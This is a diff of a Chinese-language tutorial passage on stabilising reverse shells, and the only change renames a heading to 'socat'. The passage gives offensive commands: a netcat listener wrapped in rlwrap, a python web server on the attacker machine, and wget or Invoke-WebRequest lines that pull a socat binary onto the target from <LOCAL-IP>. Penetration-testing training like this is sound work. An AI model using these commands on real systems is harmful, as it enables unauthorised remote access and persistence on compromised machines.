@@ -19,7 +19,7 @@ _技术 2：rlwrap_
 	为了使用 rlwrap，我们调用了一个稍微不同的侦听器：
 	`rlwrap nc -lvnp <port>`
 	在 netcat 监听器前面加上 “rlwrap” 为我们提供了一个功能更全面的 shell。这种技术在处理 Windows shell 时特别有用，否则很难稳定。在处理 Linux 目标时，可以使用与上一种技术的第三步相同的技巧来完全稳定：使用 Ctrl + Z 使 shell 进入后台，然后使用 `stty raw -echo; fg` 稳定并重新进入 shell。
-_技术3：索卡特_
+_技术3：socat
 	稳定 shell 的第三种简单方法是使用初始 netcat shell 作为进入功能更全面的 socat shell 的垫脚石。请记住，此技术仅限于 Linux 目标，因为 Windows 上的 Socat shell 不会比 netcat shell 更稳定。为了实现这种稳定方法，我们首先将 socat 静态编译的二进制文件（编译为没有依赖关系的程序版本）传输到目标机器。实现此目的的典型方法是在攻击计算机上包含 socat 二进制文件 （ `sudo python3 -m http.server 80` ） 的目录中使用 Web 服务器，然后在目标计算机上使用 netcat shell 下载文件。在Linux上，这将通过curl或wget（ `wget <LOCAL-IP>/socat -O /tmp/socat` ）完成。
 	-----------------------------------------
 	为了完整起见：在Windows CLI环境中，可以使用Invoke-WebRequest或webrequest系统类使用Powershell完成相同的操作，具体取决于安装的Powershell版本（ `Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe` ）。在即将到来的任务中，我们将介绍使用 Socat 发送和接收 shell 的语法。
